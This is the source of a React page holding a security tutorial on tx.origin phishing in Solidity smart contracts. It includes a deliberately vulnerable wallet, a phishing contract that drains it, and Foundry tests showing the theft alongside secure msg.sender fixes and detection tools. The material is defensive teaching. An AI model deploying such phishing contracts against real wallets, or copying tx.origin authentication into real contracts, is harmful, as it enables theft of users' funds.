'use client';

import Link from 'next/link';
import { Breadcrumb, AlertBox } from '@/components/learn/LearnComponents';
import { CodeBlock } from '@/components/CodeBlock';
import '../../styles.css';

export default function TxOriginPhishingPage() {
  return (
    <div className="learn-content">
      <Breadcrumb items={[
        { label: 'HexiLearn', href: '/learn' },
        { label: 'Vulnerabilities', href: '/learn/vulnerabilities' },
        { label: 'tx.origin Phishing' },
      ]} />

      {/* Article Header */}
      <header className="mb-12">
        <div className="flex flex-wrap gap-2 mb-4">
          <span className="px-3 py-1 text-xs font-medium rounded-full bg-green-500/20 text-green-400 border border-green-500/30">
            Beginner
          </span>
          <span className="px-3 py-1 text-xs font-medium rounded-full bg-orange-500/20 text-orange-400 border border-orange-500/30">
            High Severity
          </span>
        </div>
        
        <h1>tx.origin Phishing Attacks</h1>
        
        <p className="text-xl text-gray-300 mt-4">
          Why using <code>tx.origin</code> for authentication is dangerous and how attackers 
          can exploit it to drain funds through seemingly innocent interactions.
        </p>

        <div className="flex flex-wrap items-center gap-4 text-sm text-gray-500 mt-6">
          <span className="flex items-center gap-1">
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            4 min read
          </span>
          <span>•</span>
          <span>Updated Jan 2025</span>
          <span>•</span>
          <span>By Hexific Security Team</span>
        </div>
      </header>

      {/* Key Stats */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
        <div className="p-4 bg-green-500/10 border border-green-500/20 rounded-xl text-center">
          <div className="text-2xl font-bold text-green-400">Easy</div>
          <div className="text-xs text-gray-500">To Understand</div>
        </div>
        <div className="p-4 bg-red-500/10 border border-red-500/20 rounded-xl text-center">
          <div className="text-2xl font-bold text-red-400">100%</div>
          <div className="text-xs text-gray-500">Fund Drainage</div>
        </div>
        <div className="p-4 bg-purple-500/10 border border-purple-500/20 rounded-xl text-center">
          <div className="text-2xl font-bold text-purple-400">1 Line</div>
          <div className="text-xs text-gray-500">Fix Required</div>
        </div>
        <div className="p-4 bg-lime-500/10 border border-lime-500/20 rounded-xl text-center">
          <div className="text-2xl font-bold text-lime-400">msg.sender</div>
          <div className="text-xs text-gray-500">The Solution</div>
        </div>
      </div>

      {/* Table of Contents */}
      <nav className="mb-12 p-6 rounded-xl bg-white/[0.02] border border-lime-400/10">
        <h4 className="text-sm font-semibold text-lime-400 uppercase tracking-wider mb-4">
          📑 Table of Contents
        </h4>
        <ul className="space-y-2 text-sm">
          <li><a href="#understanding" className="toc-link hover:text-lime-400">Understanding tx.origin vs msg.sender</a></li>
          <li><a href="#the-attack" className="toc-link hover:text-lime-400">How the Attack Works</a></li>
          <li><a href="#attack-scenario" className="toc-link hover:text-lime-400">Complete Attack Scenario</a></li>
          <li><a href="#vulnerable-patterns" className="toc-link hover:text-lime-400">Vulnerable Code Patterns</a></li>
          <li><a href="#real-examples" className="toc-link hover:text-lime-400">Real-World Context</a></li>
          <li><a href="#prevention" className="toc-link hover:text-lime-400">Prevention Strategies</a></li>
          <li><a href="#legitimate-uses" className="toc-link hover:text-lime-400">Legitimate Uses of tx.origin</a></li>
          <li><a href="#testing" className="toc-link hover:text-lime-400">Testing for tx.origin Issues</a></li>
        </ul>
      </nav>

      {/* Article Content */}
      <article>
        <section id="understanding">
          <h2>Understanding tx.origin vs msg.sender</h2>
          <p>
            Before diving into the attack, it's crucial to understand the difference between 
            these two global variables that identify who is calling your contract.
          </p>

          <div className="my-8 grid md:grid-cols-2 gap-4">
            <div className="p-5 bg-lime-400/5 border border-lime-400/20 rounded-xl">
              <div className="flex items-center gap-2 mb-3">
                <span className="text-2xl">✅</span>
                <h4 className="font-semibold text-lime-400">msg.sender</h4>
              </div>
              <p className="text-sm text-gray-400 mb-4">
                The <strong>immediate caller</strong> of the current function. This changes 
                with each call in the chain.
              </p>
              <ul className="text-sm text-gray-400 space-y-1">
                <li>• Can be an EOA (user wallet)</li>
                <li>• Can be a contract</li>
                <li>• Changes at each call level</li>
                <li>• <span className="text-lime-400">Safe for authentication</span></li>
              </ul>
            </div>

            <div className="p-5 bg-red-500/5 border border-red-500/20 rounded-xl">
              <div className="flex items-center gap-2 mb-3">
                <span className="text-2xl">⚠️</span>
                <h4 className="font-semibold text-red-400">tx.origin</h4>
              </div>
              <p className="text-sm text-gray-400 mb-4">
                The <strong>original sender</strong> who initiated the transaction. This 
                never changes, regardless of how many contracts are called.
              </p>
              <ul className="text-sm text-gray-400 space-y-1">
                <li>• Always an EOA (user wallet)</li>
                <li>• Never a contract</li>
                <li>• Same throughout entire tx</li>
                <li>• <span className="text-red-400">Dangerous for authentication</span></li>
              </ul>
            </div>
          </div>

          <div className="my-8 p-6 bg-white/[0.02] border border-lime-400/10 rounded-xl">
            <h4 className="text-lime-400 font-semibold mb-4">🔗 Call Chain Visualization</h4>
            
            <div className="space-y-2">
              <div className="flex items-center gap-3 p-3 bg-blue-500/10 border border-blue-500/20 rounded-lg">
                <span className="text-2xl">👤</span>
                <div className="flex-1">
                  <span className="text-sm text-blue-400 font-medium">Alice (EOA)</span>
                  <p className="text-xs text-gray-500">Initiates transaction</p>
                </div>
                <div className="text-xs text-gray-400">
                  <div>tx.origin = Alice</div>
                  <div>msg.sender = <span className="text-gray-600">N/A</span></div>
                </div>
              </div>
              
              <div className="flex justify-center">
                <svg className="w-4 h-4 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 14l-7 7m0 0l-7-7m7 7V3" />
                </svg>
              </div>
              
              <div className="flex items-center gap-3 p-3 bg-purple-500/10 border border-purple-500/20 rounded-lg">
                <span className="text-2xl">📄</span>
                <div className="flex-1">
                  <span className="text-sm text-purple-400 font-medium">Contract A</span>
                  <p className="text-xs text-gray-500">First contract called</p>
                </div>
                <div className="text-xs text-gray-400">
                  <div>tx.origin = <span className="text-blue-400">Alice</span></div>
                  <div>msg.sender = <span className="text-blue-400">Alice</span></div>
                </div>
              </div>
              
              <div className="flex justify-center">
                <svg className="w-4 h-4 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 14l-7 7m0 0l-7-7m7 7V3" />
                </svg>
              </div>
              
              <div className="flex items-center gap-3 p-3 bg-orange-500/10 border border-orange-500/20 rounded-lg">
                <span className="text-2xl">📄</span>
                <div className="flex-1">
                  <span className="text-sm text-orange-400 font-medium">Contract B</span>
                  <p className="text-xs text-gray-500">Called by Contract A</p>
                </div>
                <div className="text-xs text-gray-400">
                  <div>tx.origin = <span className="text-blue-400">Alice</span> <span className="text-yellow-400">← Same!</span></div>
                  <div>msg.sender = <span className="text-purple-400">Contract A</span> <span className="text-lime-400">← Changed!</span></div>
                </div>
              </div>
            </div>
            
            <div className="mt-4 p-3 bg-yellow-500/10 border border-yellow-500/20 rounded-lg">
              <span className="text-sm text-yellow-400">
                💡 <strong>Key insight:</strong> tx.origin always points to Alice, even when 
                Contract A calls Contract B. This is what enables the phishing attack!
              </span>
            </div>
          </div>
        </section>

        <section id="the-attack">
          <h2>How the Attack Works</h2>
          <p>
            The tx.origin phishing attack exploits the fact that tx.origin doesn't change 
            when a contract makes a call. An attacker tricks a victim into interacting with 
            a malicious contract, which then calls the victim's contract using the victim's identity.
          </p>

          <div className="my-8 p-6 bg-gradient-to-r from-red-500/10 via-orange-500/10 to-red-500/10 border border-red-500/20 rounded-xl">
            <h4 className="font-semibold text-white mb-4 text-center">🎣 Phishing Attack Flow</h4>
            
            <div className="space-y-4">
              <div className="flex items-start gap-4">
                <span className="flex-shrink-0 w-8 h-8 bg-red-500/30 rounded-full flex items-center justify-center text-red-400 font-bold text-sm">1</span>
                <div>
                  <h5 className="font-medium text-white">Attacker Deploys Malicious Contract</h5>
                  <p className="text-sm text-gray-400">
                    The attacker creates a contract that looks innocent (e.g., airdrop claim, 
                    NFT mint, or fake DeFi protocol).
                  </p>
                </div>
              </div>
              
              <div className="flex items-start gap-4">
                <span className="flex-shrink-0 w-8 h-8 bg-orange-500/30 rounded-full flex items-center justify-center text-orange-400 font-bold text-sm">2</span>
                <div>
                  <h5 className="font-medium text-white">Victim Interacts with Malicious Contract</h5>
                  <p className="text-sm text-gray-400">
                    Through social engineering (fake website, Discord link, etc.), the victim 
                    is tricked into calling a function on the malicious contract.
                  </p>
                </div>
              </div>
              
              <div className="flex items-start gap-4">
                <span className="flex-shrink-0 w-8 h-8 bg-yellow-500/30 rounded-full flex items-center justify-center text-yellow-400 font-bold text-sm">3</span>
                <div>
                  <h5 className="font-medium text-white">Malicious Contract Calls Victim's Wallet Contract</h5>
                  <p className="text-sm text-gray-400">
                    The malicious contract internally calls the victim's wallet (or any contract 
                    that uses tx.origin for auth).
                  </p>
                </div>
              </div>
              
              <div className="flex items-start gap-4">
                <span className="flex-shrink-0 w-8 h-8 bg-red-500/30 rounded-full flex items-center justify-center text-red-400 font-bold text-sm">4</span>
                <div>
                  <h5 className="font-medium text-white">tx.origin Check Passes!</h5>
                  <p className="text-sm text-gray-400">
                    Since tx.origin is still the victim's address, the wallet contract thinks 
                    the legitimate owner is making the call. Funds are stolen.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </section>

        <section id="attack-scenario">
          <h2>Complete Attack Scenario</h2>
          <p>
            Let's walk through a complete attack with code. Imagine a simple wallet contract 
            that uses tx.origin to verify the owner:
          </p>

          <CodeBlock
            code={`// 🚨 VULNERABLE: Wallet using tx.origin for authentication
contract VulnerableWallet {
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    // 💀 DANGEROUS: Uses tx.origin for authentication
    function withdraw(address to, uint256 amount) external {
        require(tx.origin == owner, "Not owner");  // 🚨 BUG!
        
        (bool success,) = to.call{value: amount}("");
        require(success, "Transfer failed");
    }
    
    receive() external payable {}
}`}
            language="solidity"
            filename="VulnerableWallet.sol"
          />

          <p className="mt-6">
            Now the attacker deploys a phishing contract:
          </p>

          <CodeBlock
            code={`// 🎣 ATTACKER: Phishing contract disguised as legitimate service
contract PhishingContract {
    VulnerableWallet public targetWallet;
    address public attacker;
    
    constructor(address _wallet) {
        targetWallet = VulnerableWallet(payable(_wallet));
        attacker = msg.sender;
    }
    
    // Disguised as "claim airdrop" or "mint NFT"
    function claimReward() external {
        // Victim thinks they're claiming a reward...
        // But this actually calls the victim's wallet!
        
        // tx.origin is still the victim, so this works!
        targetWallet.withdraw(
            attacker,
            address(targetWallet).balance
        );
    }
    
    // Or hidden in a fallback/receive function
    receive() external payable {
        // Even just receiving ETH can trigger the attack!
        if (address(targetWallet).balance > 0) {
            targetWallet.withdraw(attacker, address(targetWallet).balance);
        }
    }
}`}
            language="solidity"
            filename="PhishingContract.sol"
          />

          <AlertBox type="danger" title="Attack Execution">
            <ol className="mt-2 space-y-1 text-sm list-decimal list-inside">
              <li>Alice deploys VulnerableWallet and deposits 10 ETH</li>
              <li>Attacker deploys PhishingContract pointing to Alice's wallet</li>
              <li>Attacker sends Alice a fake "Free NFT" link</li>
              <li>Alice calls claimReward() on the phishing contract</li>
              <li>tx.origin = Alice, so the wallet thinks Alice is calling</li>
              <li>All 10 ETH transferred to attacker! 💸</li>
            </ol>
          </AlertBox>

          <CodeBlock
            code={`// Attack flow in Foundry test
function test_TxOriginPhishing() public {
    // Setup: Alice creates wallet with 10 ETH
    vm.prank(alice);
    VulnerableWallet wallet = new VulnerableWallet();
    vm.deal(address(wallet), 10 ether);
    
    // Attacker deploys phishing contract
    vm.prank(attacker);
    PhishingContract phishing = new PhishingContract(address(wallet));
    
    uint256 attackerBalanceBefore = attacker.balance;
    
    // 🎣 Alice is tricked into calling the phishing contract
    // She thinks she's claiming an airdrop
    vm.prank(alice);  // tx.origin = alice
    phishing.claimReward();
    
    // 💀 All funds stolen!
    assertEq(address(wallet).balance, 0);
    assertEq(attacker.balance, attackerBalanceBefore + 10 ether);
}`}
            language="solidity"
            filename="TxOriginTest.t.sol"
          />
        </section>

        <section id="vulnerable-patterns">
          <h2>Vulnerable Code Patterns</h2>
          
          <h3>❌ Pattern 1: Direct tx.origin Check</h3>
          <CodeBlock
            code={`// 🚨 VULNERABLE
contract BadContract {
    address owner;
    
    modifier onlyOwner() {
        require(tx.origin == owner, "Not owner");  // 💀 WRONG!
        _;
    }
    
    function sensitiveAction() external onlyOwner {
        // Can be called by any contract when owner interacts with it
    }
}`}
            language="solidity"
            filename="BadOnlyOwner.sol"
          />

          <h3>❌ Pattern 2: tx.origin in Constructor</h3>
          <CodeBlock
            code={`// 🚨 VULNERABLE: Can be exploited via factory patterns
contract BadFactory {
    address public admin;
    
    constructor() {
        admin = tx.origin;  // 💀 If deployed by another contract, wrong admin!
    }
}`}
            language="solidity"
            filename="BadFactory.sol"
          />

          <h3>❌ Pattern 3: tx.origin for Multi-sig</h3>
          <CodeBlock
            code={`// 🚨 VULNERABLE: Multi-sig with tx.origin
contract BadMultiSig {
    mapping(address => bool) public isOwner;
    
    function executeTransaction(address to, uint256 value) external {
        // 💀 Any owner interacting with ANY contract can trigger this
        require(isOwner[tx.origin], "Not owner");
        
        (bool success,) = to.call{value: value}("");
        require(success);
    }
}`}
            language="solidity"
            filename="BadMultiSig.sol"
          />

          <h3>❌ Pattern 4: Mixed Usage (Still Dangerous)</h3>
          <CodeBlock
            code={`// 🚨 VULNERABLE: Mixing tx.origin with msg.sender doesn't help
contract StillVulnerable {
    address owner;
    
    function withdraw() external {
        // This check is useless if the next one uses tx.origin
        require(msg.sender != address(0), "Zero sender");
        
        // 💀 Still vulnerable!
        require(tx.origin == owner, "Not owner");
        
        // Drain funds...
    }
}`}
            language="solidity"
            filename="StillVulnerable.sol"
          />
        </section>

        <section id="real-examples">
          <h2>Real-World Context</h2>
          <p>
            While tx.origin phishing is well-documented and taught in every Solidity course, 
            it remains a risk because:
          </p>

          <div className="space-y-4 my-6">
            <div className="p-5 bg-gradient-to-r from-purple-500/10 to-transparent border border-purple-500/20 rounded-xl">
              <div className="flex items-center justify-between mb-3">
                <h4 className="font-semibold text-white">Legacy Contracts</h4>
                <span className="text-xs text-gray-500">Ongoing Risk</span>
              </div>
              <p className="text-sm text-gray-400">
                Many early Ethereum contracts (2015-2017) used tx.origin before the 
                vulnerability was widely understood. Some still hold significant value.
              </p>
            </div>

            <div className="p-5 bg-gradient-to-r from-orange-500/10 to-transparent border border-orange-500/20 rounded-xl">
              <div className="flex items-center justify-between mb-3">
                <h4 className="font-semibold text-white">Smart Contract Wallets</h4>
                <span className="text-xs text-gray-500">Account Abstraction Era</span>
              </div>
              <p className="text-sm text-gray-400">
                With ERC-4337 and smart contract wallets becoming common, tx.origin-based 
                checks become even more problematic as the transaction initiator may differ 
                from the account owner.
              </p>
            </div>

            <div className="p-5 bg-gradient-to-r from-red-500/10 to-transparent border border-red-500/20 rounded-xl">
              <div className="flex items-center justify-between mb-3">
                <h4 className="font-semibold text-white">CTF Challenges & Education</h4>
                <span className="text-xs text-gray-500">Learning</span>
              </div>
              <p className="text-sm text-gray-400">
                tx.origin phishing is featured in Ethernaut (Level 4), Damn Vulnerable DeFi, 
                and other CTFs because it's a fundamental concept every developer must understand.
              </p>
            </div>

            <div className="p-5 bg-gradient-to-r from-yellow-500/10 to-transparent border border-yellow-500/20 rounded-xl">
              <div className="flex items-center justify-between mb-3">
                <h4 className="font-semibold text-white">Auditor Findings</h4>
                <span className="text-xs text-gray-500">Common in Audits</span>
              </div>
              <p className="text-sm text-gray-400">
                Security auditors regularly flag tx.origin usage. It's considered a high-severity 
                finding by most audit firms and automated tools like Slither and Mythril.
              </p>
            </div>
          </div>

          <AlertBox type="warning" title="Why This Still Matters">
            Even though tx.origin phishing is "well known," new developers make this 
            mistake regularly. According to audit statistics, approximately 2-3% of 
            audited contracts still contain tx.origin vulnerabilities.
          </AlertBox>
        </section>

        <section id="prevention">
          <h2>Prevention Strategies</h2>

          <div className="grid md:grid-cols-2 gap-4 my-6">
            <div className="p-5 bg-lime-400/5 border border-lime-400/20 rounded-xl">
              <div className="flex items-center gap-2 mb-3">
                <span className="text-2xl">✅</span>
                <h4 className="font-semibold text-lime-400">Use msg.sender</h4>
              </div>
              <p className="text-sm text-gray-400">
                Always use <code>msg.sender</code> for authentication. It represents 
                the immediate caller, which is what you actually want to verify.
              </p>
            </div>

            <div className="p-5 bg-lime-400/5 border border-lime-400/20 rounded-xl">
              <div className="flex items-center gap-2 mb-3">
                <span className="text-2xl">📦</span>
                <h4 className="font-semibold text-lime-400">Use OpenZeppelin</h4>
              </div>
              <p className="text-sm text-gray-400">
                Use OpenZeppelin's <code>Ownable</code>, <code>AccessControl</code>, or 
                other auth patterns. They're audited and never use tx.origin.
              </p>
            </div>

            <div className="p-5 bg-lime-400/5 border border-lime-400/20 rounded-xl">
              <div className="flex items-center gap-2 mb-3">
                <span className="text-2xl">🔧</span>
                <h4 className="font-semibold text-lime-400">Use Static Analysis</h4>
              </div>
              <p className="text-sm text-gray-400">
                Tools like Slither automatically detect tx.origin usage. Add them to 
                your CI/CD pipeline.
              </p>
            </div>

            <div className="p-5 bg-lime-400/5 border border-lime-400/20 rounded-xl">
              <div className="flex items-center gap-2 mb-3">
                <span className="text-2xl">🧪</span>
                <h4 className="font-semibold text-lime-400">Test Attack Scenarios</h4>
              </div>
              <p className="text-sm text-gray-400">
                Write tests that simulate phishing attacks. If your contract can be 
                exploited via intermediary contracts, you'll catch it.
              </p>
            </div>
          </div>

          <h3>✅ Correct Implementation</h3>
          <CodeBlock
            code={`// ✅ SECURE: Using msg.sender for authentication
contract SecureWallet {
    address public owner;
    
    constructor() {
        owner = msg.sender;  // ✅ msg.sender is fine in constructor
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");  // ✅ CORRECT!
        _;
    }
    
    function withdraw(address to, uint256 amount) external onlyOwner {
        (bool success,) = to.call{value: amount}("");
        require(success, "Transfer failed");
    }
    
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Zero address");
        owner = newOwner;
    }
    
    receive() external payable {}
}

// Even better: Use OpenZeppelin
import "@openzeppelin/contracts/access/Ownable.sol";

contract BetterWallet is Ownable {
    constructor() Ownable(msg.sender) {}
    
    function withdraw(address to, uint256 amount) external onlyOwner {
        (bool success,) = to.call{value: amount}("");
        require(success, "Transfer failed");
    }
    
    receive() external payable {}
}`}
            language="solidity"
            filename="SecureWallet.sol"
          />

          <h3>✅ Preventing Phishing Attack</h3>
          <CodeBlock
            code={`// With msg.sender, the phishing attack FAILS
contract PhishingContract {
    SecureWallet public targetWallet;
    address public attacker;
    
    constructor(address _wallet) {
        targetWallet = SecureWallet(payable(_wallet));
        attacker = msg.sender;
    }
    
    function attemptPhishing() external {
        // This will REVERT!
        // msg.sender in SecureWallet will be THIS contract, not the victim
        // "Not owner" error will be thrown
        targetWallet.withdraw(attacker, address(targetWallet).balance);
    }
}

// Test showing the attack fails
function test_PhishingFails() public {
    // Alice creates secure wallet
    vm.prank(alice);
    SecureWallet wallet = new SecureWallet();
    vm.deal(address(wallet), 10 ether);
    
    // Attacker deploys phishing contract
    vm.prank(attacker);
    PhishingContract phishing = new PhishingContract(address(wallet));
    
    // Alice is tricked into calling phishing contract
    vm.prank(alice);
    
    // ✅ This reverts! Funds are SAFE!
    vm.expectRevert("Not owner");
    phishing.attemptPhishing();
    
    // Wallet still has all funds
    assertEq(address(wallet).balance, 10 ether);
}`}
            language="solidity"
            filename="PhishingFails.t.sol"
          />
        </section>

        <section id="legitimate-uses">
          <h2>Legitimate Uses of tx.origin</h2>
          <p>
            While tx.origin should never be used for authentication, there are a few 
            legitimate use cases:
          </p>

          <CodeBlock
            code={`// ✅ LEGITIMATE: Preventing contracts from calling
contract NoContractCalls {
    // Ensure only EOAs can call, not contracts
    // Useful for some anti-bot mechanisms
    modifier onlyEOA() {
        require(tx.origin == msg.sender, "No contracts allowed");
        _;
    }
    
    function humanOnlyAction() external onlyEOA {
        // Only externally owned accounts can call this
        // Note: This is NOT foolproof (constructor calls bypass this)
    }
}

// ✅ LEGITIMATE: Gas refunds to transaction initiator
contract GasRefunder {
    function expensiveOperation() external {
        uint256 gasStart = gasleft();
        
        // ... do expensive work ...
        
        // Refund gas to the actual user who paid for the tx
        uint256 gasUsed = gasStart - gasleft();
        uint256 refund = gasUsed * tx.gasprice;
        
        // tx.origin is appropriate here - refund goes to whoever paid
        payable(tx.origin).transfer(refund);
    }
}

// ✅ LEGITIMATE: Logging/analytics (non-security-critical)
contract Analytics {
    event UserAction(address indexed txOrigin, address indexed caller, string action);
    
    function doSomething() external {
        // Using tx.origin for analytics is fine
        // It's not used for any security decisions
        emit UserAction(tx.origin, msg.sender, "doSomething");
        
        // Security-critical logic uses msg.sender
        require(msg.sender == owner, "Not authorized");
    }
}`}
            language="solidity"
            filename="LegitimateUses.sol"
          />

          <AlertBox type="warning" title="⚠️ EOA Check Limitations">
            The <code>tx.origin == msg.sender</code> check to prevent contract calls 
            can be bypassed by calling from a contract's constructor (during deployment, 
            the contract has no code yet). This is not a reliable anti-bot mechanism.
          </AlertBox>
        </section>

        <section id="testing">
          <h2>Testing for tx.origin Issues</h2>

          <CodeBlock
            code={`// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

// Contract to test
contract TargetContract {
    address public owner;
    uint256 public value;
    bool public useTxOrigin;  // Toggle for testing both
    
    constructor(bool _useTxOrigin) {
        owner = msg.sender;
        useTxOrigin = _useTxOrigin;
    }
    
    function setValue(uint256 _value) external {
        if (useTxOrigin) {
            require(tx.origin == owner, "Not owner");  // 🚨 Vulnerable
        } else {
            require(msg.sender == owner, "Not owner");  // ✅ Secure
        }
        value = _value;
    }
}

// Attacker contract for phishing simulation
contract AttackerContract {
    TargetContract public target;
    
    constructor(address _target) {
        target = TargetContract(_target);
    }
    
    function attack(uint256 maliciousValue) external {
        target.setValue(maliciousValue);
    }
}

contract TxOriginTest is Test {
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    
    function test_TxOriginVulnerable() public {
        // Deploy vulnerable contract
        vm.prank(owner);
        TargetContract vulnerable = new TargetContract(true);  // Uses tx.origin
        
        // Deploy attacker contract
        vm.prank(attacker);
        AttackerContract attackerContract = new AttackerContract(address(vulnerable));
        
        // 🎣 Owner is tricked into calling attacker's contract
        vm.prank(owner);
        attackerContract.attack(999);  // Phishing!
        
        // 💀 Attack succeeded - value was changed through intermediary
        assertEq(vulnerable.value(), 999);
    }
    
    function test_MsgSenderSecure() public {
        // Deploy secure contract  
        vm.prank(owner);
        TargetContract secure = new TargetContract(false);  // Uses msg.sender
        
        // Deploy attacker contract
        vm.prank(attacker);
        AttackerContract attackerContract = new AttackerContract(address(secure));
        
        // 🎣 Owner is tricked into calling attacker's contract
        vm.prank(owner);
        
        // ✅ Attack FAILS - msg.sender is the attacker contract, not owner
        vm.expectRevert("Not owner");
        attackerContract.attack(999);
        
        // Value unchanged
        assertEq(secure.value(), 0);
    }
    
    function test_DirectCallStillWorks() public {
        vm.prank(owner);
        TargetContract secure = new TargetContract(false);
        
        // Direct calls by owner still work
        vm.prank(owner);
        secure.setValue(42);
        
        assertEq(secure.value(), 42);
    }
    
    // Fuzz test: no intermediary should be able to impersonate owner
    function testFuzz_NoImpersonation(address intermediary, uint256 value) public {
        vm.assume(intermediary != owner);
        vm.assume(intermediary != address(0));
        
        vm.prank(owner);
        TargetContract secure = new TargetContract(false);
        
        // Create intermediary contract
        vm.prank(intermediary);
        AttackerContract attackerContract = new AttackerContract(address(secure));
        
        // Owner calling through intermediary should fail
        vm.prank(owner);
        vm.expectRevert("Not owner");
        attackerContract.attack(value);
    }
}`}
            language="solidity"
            filename="TxOriginTest.t.sol"
          />

          <div className="my-6 p-5 bg-white/[0.02] border border-lime-400/10 rounded-xl">
            <h4 className="font-semibold text-lime-400 mb-3">🔧 Detection Tools</h4>
            <div className="grid md:grid-cols-2 gap-4">
              <div>
                <h5 className="text-sm font-medium text-white mb-2">Slither</h5>
                <code className="text-xs text-gray-400 block bg-black/30 p-2 rounded">slither . --detect tx-origin</code>
              </div>
              <div>
                <h5 className="text-sm font-medium text-white mb-2">Mythril</h5>
                <code className="text-xs text-gray-400 block bg-black/30 p-2 rounded">myth analyze Contract.sol</code>
              </div>
              <div>
                <h5 className="text-sm font-medium text-white mb-2">Solhint</h5>
                <code className="text-xs text-gray-400 block bg-black/30 p-2 rounded">solhint "**/*.sol"</code>
              </div>
              <div>
                <h5 className="text-sm font-medium text-white mb-2">Aderyn</h5>
                <code className="text-xs text-gray-400 block bg-black/30 p-2 rounded">aderyn .</code>
              </div>
            </div>
          </div>
        </section>

        {/* Security Checklist */}
        <section className="my-12 p-6 bg-lime-400/5 border border-lime-400/20 rounded-xl">
          <h3 className="text-xl font-bold text-lime-400 mb-4">✅ tx.origin Safety Checklist</h3>
          <div className="grid md:grid-cols-2 gap-3">
            {[
              'Never use tx.origin for authentication',
              'Always use msg.sender for access control',
              'Use OpenZeppelin Ownable/AccessControl',
              'Run Slither with tx-origin detector',
              'Test with intermediary contract attacks',
              'Review all require() statements for tx.origin',
              'Check constructor for tx.origin usage',
              'Consider smart contract wallet compatibility',
            ].map((item, index) => (
              <div key={index} className="flex items-center gap-2 text-sm">
                <span className="text-lime-400">☐</span>
                <span className="text-gray-300">{item}</span>
              </div>
            ))}
          </div>
        </section>

        {/* Quick Reference */}
        <section className="my-12 p-6 bg-white/[0.02] border border-lime-400/10 rounded-xl">
          <h3 className="text-xl font-bold text-white mb-4">📚 Quick Reference</h3>
          
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="border-b border-gray-700">
                  <th className="text-left py-3 px-4 text-gray-400">Aspect</th>
                  <th className="text-left py-3 px-4 text-red-400">tx.origin</th>
                  <th className="text-left py-3 px-4 text-lime-400">msg.sender</th>
                </tr>
              </thead>
              <tbody className="text-gray-300">
                <tr className="border-b border-gray-800">
                  <td className="py-3 px-4 font-medium">Definition</td>
                  <td className="py-3 px-4">Original transaction sender</td>
                  <td className="py-3 px-4">Immediate caller</td>
                </tr>
                <tr className="border-b border-gray-800">
                  <td className="py-3 px-4 font-medium">Can be contract?</td>
                  <td className="py-3 px-4">❌ Never (always EOA)</td>
                  <td className="py-3 px-4">✅ Yes</td>
                </tr>
                <tr className="border-b border-gray-800">
                  <td className="py-3 px-4 font-medium">Changes in call chain?</td>
                  <td className="py-3 px-4">❌ No (stays same)</td>
                  <td className="py-3 px-4">✅ Yes (updates per call)</td>
                </tr>
                <tr className="border-b border-gray-800">
                  <td className="py-3 px-4 font-medium">Safe for auth?</td>
                  <td className="py-3 px-4">❌ No</td>
                  <td className="py-3 px-4">✅ Yes</td>
                </tr>
                <tr>
                  <td className="py-3 px-4 font-medium">Phishing vulnerable?</td>
                  <td className="py-3 px-4">⚠️ Yes</td>
                  <td className="py-3 px-4">✅ No</td>
                </tr>
              </tbody>
            </table>
          </div>
        </section>
      </article>

      {/* Article Footer */}
      <footer className="mt-16 pt-8 border-t border-lime-400/10">
        <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-6">
          <div>
            <h4 className="text-sm text-gray-500 mb-2">Tags</h4>
            <div className="flex flex-wrap gap-2">
              {['tx.origin', 'msg.sender', 'Phishing', 'Authentication', 'Access Control', 'Solidity'].map((tag) => (
                <span key={tag} className="px-3 py-1 text-xs text-lime-400/70 bg-lime-400/10 rounded-full">
                  {tag}
                </span>
              ))}
            </div>
          </div>
          
          <div className="flex gap-3">
            <button className="p-2 text-gray-400 hover:text-lime-400 hover:bg-lime-400/10 rounded-lg transition-colors">
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8.684 13.342C8.886 12.938 9 12.482 9 12c0-.482-.114-.938-.316-1.342m0 2.684a3 3 0 110-2.684m0 2.684l6.632 3.316m-6.632-6l6.632-3.316m0 0a3 3 0 105.367-2.684 3 3 0 00-5.367 2.684zm0 9.316a3 3 0 105.368 2.684 3 3 0 00-5.368-2.684z" />
              </svg>
            </button>
            <button className="p-2 text-gray-400 hover:text-lime-400 hover:bg-lime-400/10 rounded-lg transition-colors">
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 5a2 2 0 012-2h10a2 2 0 012 2v16l-7-3.5L5 21V5z" />
              </svg>
            </button>
          </div>
        </div>

        {/* Related Articles */}
        <div className="mt-12">
          <h3 className="text-lg font-semibold text-white mb-4">Related Articles</h3>
          <div className="grid md:grid-cols-2 gap-4">
            <Link href="/learn/vulnerabilities/access-control-vulnerabilities" className="p-4 bg-white/[0.02] border border-lime-400/10 rounded-xl hover:border-lime-400/30 transition-colors group">
              <h4 className="font-medium text-white group-hover:text-lime-400 transition-colors">Access Control Vulnerabilities</h4>
              <p className="text-sm text-gray-500 mt-1">More authentication pitfalls</p>
            </Link>
            <Link href="/learn/vulnerabilities/signature-replay" className="p-4 bg-white/[0.02] border border-lime-400/10 rounded-xl hover:border-lime-400/30 transition-colors group">
              <h4 className="font-medium text-white group-hover:text-lime-400 transition-colors">Signature Replay Attacks</h4>
              <p className="text-sm text-gray-500 mt-1">Another identity-based vulnerability</p>
            </Link>
          </div>
        </div>

        {/* CTA */}
        <div className="mt-12 p-6 bg-lime-400/5 border border-lime-400/20 rounded-xl">
          <h3 className="font-semibold text-white mb-2">🎓 Practice This Vulnerability</h3>
          <p className="text-sm text-gray-400 mb-4">
